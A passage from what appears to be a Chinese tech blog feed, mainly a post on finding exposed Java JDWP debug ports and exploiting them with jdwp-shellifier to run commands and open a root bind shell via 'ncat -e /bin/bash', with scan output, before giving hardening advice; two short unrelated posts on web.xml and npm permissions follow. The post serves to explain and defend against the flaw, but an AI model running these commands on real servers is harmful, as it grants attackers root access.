1.1</span><br><span class="line">9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9998/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9999/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.42 seconds</span><br></pre></td></tr></table></figure><p>从扫描的结果中可以看到<code>10010</code>端口开启了远程调试。</p><h3 id="端口明明开了，却没有扫描到？"><a href="#端口明明开了，却没有扫描到？" class="headerlink" title="端口明明开了，却没有扫描到？"></a>端口明明开了，却没有扫描到？</h3><p>nmap默认只扫描每个协议常见的1000个端口，如果你的端口不在里面，默认就不会扫描。</p><blockquote><p><a href="https://nmap.org/book/man-port-specification.html" rel="external nofollow noopener noreferrer" target="_blank">Nmap scans the most common 1,000 ports for each protocol</a>. If your port is not in that list, it won’t be scanned. </p></blockquote><p>端口使用的频率存储在<code>nmap-services</code>文件中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) locate nmap-services</span><br><span class="line">/usr/<span class="built_in">local</span>/Cellar/nmap/7.70/share/nmap/nmap-services</span><br></pre></td></tr></table></figure><p>可以直接查看这个文件， 也可以使用下面的命令查看对应的频率：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) sudo nmap -v -oG - -sSU</span><br><span class="line">Password:</span><br><span class="line"># Nmap 7.70 scan initiated Fri Aug 10 13:46:47 2018 as: nmap -v -oG - -sSU</span><br><span class="line"># Ports scanned: TCP(1000;1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521...省略</span><br></pre></td></tr></table></figure><p>具体说明参见： <a href="https://secwiki.org/w/FAQ_missing_port" rel="external nofollow noopener noreferrer" target="_blank">FAQ missing port - SecWiki</a></p><p>解决方案：</p><p><code>nmap</code>中可以通过<code>-p</code>指定扫描的端口范围：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo nmap -sV 221.221.221.221  -p 1-65535</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:26 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)</span><br><span class="line">Host is up (0.035s latency).</span><br><span class="line">Not shown: 65464 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">42/tcp    filtered nameserver</span><br><span class="line">80/tcp    open     http           nginx 1.10.2</span><br><span class="line">111/tcp   open     rpcbind        2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">136/tcp   filtered profile</span><br><span class="line">137/tcp   filtered netbios-ns</span><br><span class="line">138/tcp   filtered netbios-dgm</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">443/tcp   open     ssl/http       nginx 1.10.2</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">901/tcp   filtered samba-swat</span><br><span class="line">1068/tcp  filtered instl_bootc</span><br><span class="line">2745/tcp  filtered urbisnet</span><br><span class="line">3127/tcp  filtered ctx-bridge</span><br><span class="line">3128/tcp  filtered squid-http</span><br><span class="line">3333/tcp  filtered dec-notes</span><br><span class="line">3690/tcp  open     svnserve       Subversion</span><br><span class="line">3691/tcp  open     svnserve       Subversion</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">4999/tcp  open     http           Apache httpd 2.4.10 ((Debian))</span><br><span class="line">5554/tcp  filtered sgi-esphttp</span><br><span class="line">5800/tcp  filtered vnc-http</span><br><span class="line">5900/tcp  filtered vnc</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6176/tcp  filtered unknown</span><br><span class="line">6379/tcp  open     redis          Redis key-value store</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">7070/tcp  open     http           nginx 1.10.3</span><br><span class="line">8076/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8081/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8146/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8183/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8188/tcp  open     unknown</span><br><span class="line">8189/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8280/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8283/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8380/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8399/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8694/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8967/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8998/tcp  filtered canto-roboflow</span><br><span class="line">9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9058/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">9060/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171</span><br><span class="line">9260/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">9928/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">9988/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">9990/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9991/tcp  open     http           Jetty 9.4.8.v20171121</span><br><span class="line">9996/tcp  filtered palace-5</span><br><span class="line">9997/tcp  open     http           Jetty 9.4.8.v20171121</span><br><span class="line">9998/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9999/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">10018/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">11114/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171</span><br><span class="line">11211/tcp open     memcached      Memcached 1.4.34 (uptime 20219548 seconds)</span><br><span class="line">12001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">12003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">13001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">13003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">14002/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">15001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">19998/tcp open     http           Jetty 9.4.7.v20170914</span><br><span class="line">29998/tcp open     http           Jetty 9.4.7.v20170914</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 87.05 seconds</span><br></pre></td></tr></table></figure><p>上面是dev机器上开启的端口， <code>Java Debug Wire Protocol (Reference Implementation)</code>就是开启了<code>JDWP</code>的机器。</p><h2 id="二次确认"><a href="#二次确认" class="headerlink" title="二次确认"></a>二次确认</h2><blockquote><p>telnet端口后，输入命令JDWP-Handshake<br>如果返回JDWP-Handshake，证明存在漏洞。</p></blockquote><p>可以用下面的命令测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) &#123; <span class="built_in">echo</span> <span class="string">"JDWP-Handshake"</span>; sleep 20 &#125; | telnet 221.221.221.221 10010</span><br><span class="line">Trying 221.221.221.221...</span><br><span class="line">Connected to izbp16k6k2yv9vvh6c3v65zi.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">JDWP-Handshake</span><br></pre></td></tr></table></figure><p>或者使用<code>nc</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) &#123; <span class="built_in">echo</span> <span class="string">"JDWP-Handshake"</span>; sleep 1 | <span class="built_in">trap</span> <span class="built_in">exit</span> INT&#125; | nc 221.221.221.221 10010</span><br><span class="line">JDWP-Handshake</span><br></pre></td></tr></table></figure><h1 id="漏洞利用实战"><a href="#漏洞利用实战" class="headerlink" title="漏洞利用实战"></a>漏洞利用实战</h1><h2 id="确定debug的端口"><a href="#确定debug的端口" class="headerlink" title="确定debug的端口"></a>确定debug的端口</h2><p>通过<code>nmap</code>确定debug的端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation)</span><br></pre></td></tr></table></figure><h2 id="nmap执行命令"><a href="#nmap执行命令" class="headerlink" title="nmap执行命令"></a>nmap执行命令</h2><p><a href="https://nmap.org/nsedoc/scripts/jdwp-exec.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-exec NSE Script</a></p><p><a href="https://nmap.org/nsedoc/scripts/jdwp-info.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-info NSE Script</a></p><p><a href="https://nmap.org/nsedoc/scripts/jdwp-inject.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-inject NSE Script</a></p><blockquote><p>这种方式没有实验成功，有兴趣的同学可以试一试</p></blockquote><ul><li>Example Usage</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT &lt;target&gt; -p &lt;port&gt; --script=+jdwp-exec --script-args cmd=&quot;date&quot;</span><br></pre></td></tr></table></figure><ul><li>Script Output</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON</span><br><span class="line">2010/tcp open  search  syn-ack</span><br><span class="line">| jdwp-exec:</span><br><span class="line">|   date output:</span><br><span class="line">|   Sat Aug 11 15:27:21 Central European Daylight Time 2012</span><br><span class="line">|_</span><br></pre></td></tr></table></figure><h2 id="开源脚本"><a href="#开源脚本" class="headerlink" title="开源脚本"></a>开源脚本</h2><p><a href="https://github.com/IOActive/jdwp-shellifier" rel="external nofollow noopener noreferrer" target="_blank">IOActive/jdwp-shellifier</a></p><p>使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) python jdwp-shellifier.py -t 221.221.221.221 -p 10010  --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span>  --cmd <span class="string">"touch /home/777"</span></span><br><span class="line">[+] Targeting <span class="string">'221.221.221.221:10010'</span></span><br><span class="line">[+] Reading settings <span class="keyword">for</span> <span class="string">'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'</span></span><br><span class="line">[+] Found Runtime class: id=346d</span><br><span class="line">[+] Found Runtime.getRuntime(): id=7fd8f420b170</span><br><span class="line">[+] Created <span class="built_in">break</span> event id=2</span><br><span class="line">[+] Waiting <span class="keyword">for</span> an event on <span class="string">'java.lang.String.indexOf'</span></span><br><span class="line">[+] Received matching event from thread 0x355c</span><br><span class="line">[+] Selected payload <span class="string">'touch /home/777'</span></span><br><span class="line">[+] Command string object created id:355d</span><br><span class="line">[+] Runtime.getRuntime() returned context id:0x355e</span><br><span class="line">[+] found Runtime.exec(): id=7fd8f40140f0</span><br><span class="line">[+] Runtime.exec() successful, retId=355f</span><br><span class="line">[!] Command successfully executed</span><br></pre></td></tr></table></figure><p><code>break-on &quot;java.lang.String.indexOf&quot;</code>表示在这个函数打断点，当这个函数执行的时候， 后面跟着的命令就会执行，这时我们登录上机器查看下执行的结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-dev-api server]<span class="comment"># ls -alh  /home</span></span><br><span class="line">总用量 52K</span><br><span class="line">drwxr-xr-x. 13 root          root          4.0K 8月  10 14:12 .</span><br><span class="line">dr-xr-xr-x. 28 root          root          4.0K 7月  19 17:52 ..</span><br><span class="line">-rw-r--r--   1 root          root             0 8月  10 14:12 777</span><br></pre></td></tr></table></figure><p>可以看到<code>777</code>这个文件已经创建了， 时间正好是我们执行命令的时间。</p><p>这只是初级玩法， 脚本的示例给的是启动一个<code>ncat</code>的程序， 然后就可以远程连接上这个ncat开启的端口，相当于有一个<code>root</code>权限的shell了。</p><p>安装<code>ncat</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --break-on &quot;java.lang.String.indexOf&quot;  --cmd  &quot;sudo yum install -y nc&quot;</span><br></pre></td></tr></table></figure><p><code>ncat</code>在服务器上开启一个端口， 转发输入交给<code>bash</code>去执行。</p><p>开启转发服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span>  --cmd  <span class="string">"ncat -v -l -p 7777 -e /bin/bash"</span></span><br><span class="line">[+] Targeting <span class="string">'221.221.221.221:8399'</span></span><br><span class="line">[+] Reading settings <span class="keyword">for</span> <span class="string">'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'</span></span><br><span class="line">[+] Found Runtime class: id=345e</span><br><span class="line">[+] Found Runtime.getRuntime(): id=7f6420023408</span><br><span class="line">[+] Created <span class="built_in">break</span> event id=2</span><br><span class="line">[+] Waiting <span class="keyword">for</span> an event on <span class="string">'java.lang.String.indexOf'</span></span><br><span class="line">[+] Received matching event from thread 0x354e</span><br><span class="line">[+] Selected payload <span class="string">'ncat -v -l -p 7777 -e /bin/bash'</span></span><br><span class="line">[+] Command string object created id:354f</span><br><span class="line">[+] Runtime.getRuntime() returned context id:0x3550</span><br><span class="line">[+] found Runtime.exec(): id=7f6420023468</span><br><span class="line">[+] Runtime.exec() successful, retId=3551</span><br><span class="line">[!] Command successfully executed</span><br></pre></td></tr></table></figure><p>服务器上端口已经开启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-dev-api server]# sudo lsof -i:7777</span><br><span class="line">COMMAND  PID USER   FD   TYPE    DEVICE SIZE/OFF NODE NAME</span><br><span class="line">ncat    7617 root    3u  IPv6 292856080      0t0  TCP *:cbt (LISTEN)</span><br><span class="line">ncat    7617 root    4u  IPv4 292856081      0t0  TCP *:cbt (LISTEN)</span><br></pre></td></tr></table></figure><p>连接上去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) nc 221.221.221.221 7777</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">ls -alh</span><br><span class="line">total 218M</span><br><span class="line">dr-xr-x---. 18 root root 4.0K Aug 10 11:05 .</span><br><span class="line">dr-xr-xr-x. 28 root root 4.0K Jul 19 17:52 ..</span><br><span class="line">-rw-r--r--   1 root root   26 May 11 13:57 12.txt</span><br><span class="line">-rwxr-xr-x   1 root root 1.7K Jan 30  2018 214468302700277.key</span><br><span class="line">-rwxr-xr-x   1 root root 3.3K Jan 30  2018 214468302700277.pem</span><br></pre></td></tr></table></figure><h1 id="远程调试的建议"><a href="#远程调试的建议" class="headerlink" title="远程调试的建议"></a>远程调试的建议</h1><p>一、线上不能开启debug，对服务器性能有影响。</p><p>二、关闭对外远程debug的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof -i:&lt;port&gt;</span><br></pre></td></tr></table></figure><p>查找到对应的进程， 然后修改配置，<strong>重启tomcat</strong></p><p>三、远程debug步骤：</p><ol><li><p>tomcat 开启调试: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CATALINA_OPTS=<span class="string">"-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=127.0.0.1:8399"</span></span><br></pre></td></tr></table></figure><p><strong>注意必须绑定到127.0.0.1</strong></p></li><li><p>安装socat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y socat</span><br></pre></td></tr></table></figure></li><li><p>服务器安装socat进行转发:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:5005forkrange=0.0.0.0/32 TCP4:127.0.0.1:8399 | hostname -i</span><br></pre></td></tr></table></figure><p>其中<code>0.0.0.0/32</code>表示放开ip限制（不是内网没有办法限制出口ip)， <strong>命令不要在后台执行</strong>，否则跟开启了对外的远程debug没有区别</p></li><li><p>idea中新建Remote配置，host写上面输出的公网的ip， 端口写5005</p></li></ol><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><ul><li>远程调试端口的地址一定要绑定到<code>127.0.0.1</code></li><li>tomcat用单独的组的用户启动（这个组的权限要设置到较低）</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jpda1/index.html?ca=drs-" rel="external nofollow noopener noreferrer" target="_blank">深入 Java 调试体系: 第 1 部分，JPDA 体系概览</a></li><li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html" rel="external nofollow noopener noreferrer" target="_blank">Java Platform Debugger Architecture</a></li><li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jpda/jdwp-spec.html" rel="external nofollow noopener noreferrer" target="_blank">Java(tm) Debug Wire Protocol</a></li><li><a href="http://files.meetup.com/3189882/Java%20Debugger%20Internals.pdf" rel="external nofollow noopener noreferrer" target="_blank">Java Debugger Internals - Meetup</a></li><li><a href="https://_thorns.gitbooks.io/sec/content/java_debug_remote_code_execution.html" rel="external nofollow noopener noreferrer" target="_blank">Java Debug Remote Code Execution · 安全手册</a></li><li><a href="https://secwiki.org/w/FAQ_missing_port" rel="external nofollow noopener noreferrer" target="_blank">FAQ missing port - SecWiki</a></li><li><a href="https://github.com/IOActive/jdwp-shellifier" rel="external nofollow noopener noreferrer" target="_blank">IOActive/jdwp-shellifier</a></li><li><a href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/" rel="external nofollow noopener noreferrer" target="_blank">Hacking the Java Debug Wire Protocol - or - “How I met your Java debugger” | IOActive</a></li><li><a href="https://nmap.org/nsedoc/scripts/jdwp-exec.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-exec NSE Script</a></li><li><a href="https://nmap.org/nsedoc/scripts/jdwp-info.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-info NSE Script</a></li><li><a href="https://nmap.org/nsedoc/scripts/jdwp-inject.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-inject NSE Script</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;什么是JDWP？&quot;&gt;&lt;a href=&quot;#什么是JDWP？&quot; class=&quot;headerlink&quot; title=&quot;什么是JDWP？&quot;&gt;&lt;/a&gt;什么是JDWP？&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;JDWP（Java Debug Wire Protocol）是一个
      
    
    </summary>
    
      <category term="jvm" scheme="http://qsli.github.io/categories/jvm/"/>
    
    
      <category term="jdwp" scheme="http://qsli.github.io/tags/jdwp/"/>
    
  </entry>
  
  <entry>
    <title>web.xml</title>
    <link href="http://qsli.github.io/2018/08/11/web-xml/"/>
    <id>http://qsli.github.io/2018/08/11/web-xml/</id>
    <published>2018-08-11T12:42:43.012Z</published>
    <updated>2018-08-11T12:42:43.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="load-on-startup标签"><a href="#load-on-startup标签" class="headerlink" title="load-on-startup标签"></a>load-on-startup标签</h2><blockquote><p>Servlets are initialized either lazily at request processing time or eagerly during<br>deployment. In the latter case, they are initialized in the order indicated by<br>their load-on-startup elements.</p></blockquote><p>在web容器启动的时候，可以采用<code>lazily</code>加载的方式和<code>eagerly</code>的方式。</p><p><code>load-on-startup</code>中的值决定了进行哪种方式。</p><blockquote><p>If the value is a negative integer, or the element is not present, the<br>container is free to load the servlet whenever it chooses. If the value is a positive<br>integer or 0, the container must load and initialize the servlet as the application is<br>deployed.</p></blockquote><p>如果<load-on-startup>这个元素没有出现，或者出现了但是里面的值是负的，容器可以按照自己的需要选择加载Servlet的时机。</load-on-startup></p><p>如果里面的值是正数或者0，容器必须保证在容器启动的时候加载和初始化这个servlet</p><blockquote><p> The container must guarantee that servlets marked with lower integers<br>are loaded before servlets marked with higher integers.</p></blockquote><p>这个值越小，优先级越高，容器优先加载。</p><blockquote><p>The container may choose<br>the order of loading of servlets with the same load-on-startup value.</p></blockquote><p>如果里面的值是一样的，那么加载的顺序由容器来决定（不同实现可能不同）</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li>Java Servlet Specification 3.0</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;load-on-startup标签&quot;&gt;&lt;a href=&quot;#load-on-startup标签&quot; class=&quot;headerlink&quot; title=&quot;load-on-startup标签&quot;&gt;&lt;/a&gt;load-on-startup标签&lt;/h2&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="tomcat" scheme="http://qsli.github.io/categories/tomcat/"/>
    
    
      <category term="servlet" scheme="http://qsli.github.io/tags/servlet/"/>
    
  </entry>
  
  <entry>
    <title>hexo迁移到ubuntu</title>
    <link href="http://qsli.github.io/2018/08/11/hexo-ubuntu/"/>
    <id>http://qsli.github.io/2018/08/11/hexo-ubuntu/</id>
    <published>2018-08-11T12:42:41.640Z</published>
    <updated>2018-08-11T12:42:41.640Z</updated>
    
    <content type="html"><![CDATA[<p>系统切换到ubuntu之后，使用的apt安装的node，默认权限是sudo。安装hexo之后也必须以sudo身份执行。<br>需要修改下node的权限，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  qsli.github.com (hexo|✚1…)  npm config get prefix</span><br><span class="line">/usr/local</span><br></pre></td></tr></table></figure><p>修改owner</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R $(whoami) $(npm config get prefix)/&#123;lib/node_modules,bin,share&#125;</span><br></pre></td></tr></table></figure><p>修改owner之后就可以正常执行hexo了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://docs.npmjs.com/getting-started/fixing-npm-permissions" rel="external nofollow noopener noreferrer" target="_blank">03 - Fixing npm permissions | npm Documentation</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;系统切换到ubuntu之后，使用的apt安装的node，默认权限是sudo。安装hexo之后也必须以sudo身份执行。&lt;br&gt;需要修改下node的权限，命令如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas
      
    
    </summary>
    
      <category term="hexo" scheme="http://qsli.github.io/categories/hexo/"/>
    
    
      <category term="hexo" scheme="http://qsli.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>linux终端对齐问题</title>
    <link href="http://qsli.github.io/2018/07/11/column-view/"/>
    <id>http://qsli.github.io/2018/07/11/column-view/</id>
    <published>2018-07-10T16:59:00.000Z</published>
    <updated>2018-08-11T12:42:41.216Z</updated>
    
